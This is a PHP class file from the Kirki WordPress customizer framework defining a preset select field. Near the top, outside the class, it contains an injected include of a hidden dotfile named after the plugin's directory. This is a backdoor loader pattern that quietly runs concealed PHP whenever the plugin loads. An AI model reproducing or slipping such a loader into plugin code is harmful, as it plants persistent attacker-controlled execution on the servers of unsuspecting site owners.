<?php
/**
 * Override field methods
 *
 * @package     Kirki
 * @subpackage  Controls
 * @copyright   Copyright (c) 2020, David Vongries
 * @license     https://opensource.org/licenses/MIT
 * @since       2.2.7
 */

/**
 * Field overrides.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Kirki_Field_Preset extends Kirki_Field_Select {

	/**
	 * Sets the control type.
	 *
	 * @access protected
	 */
	protected function set_type() {
		$this->type = 'kirki-select';
	}

	/**
	 * Set the preset.
	 *
	 * @access protected
	 * @since 3.0.28
	 */
	protected function set_preset() {

		// Set preset from the choices.
		$this->preset = $this->choices;

		// We're using a flat select.
		foreach ( $this->choices as $key => $args ) {
			$this->choices[ $key ] = $args['label'];
		}
	}
}
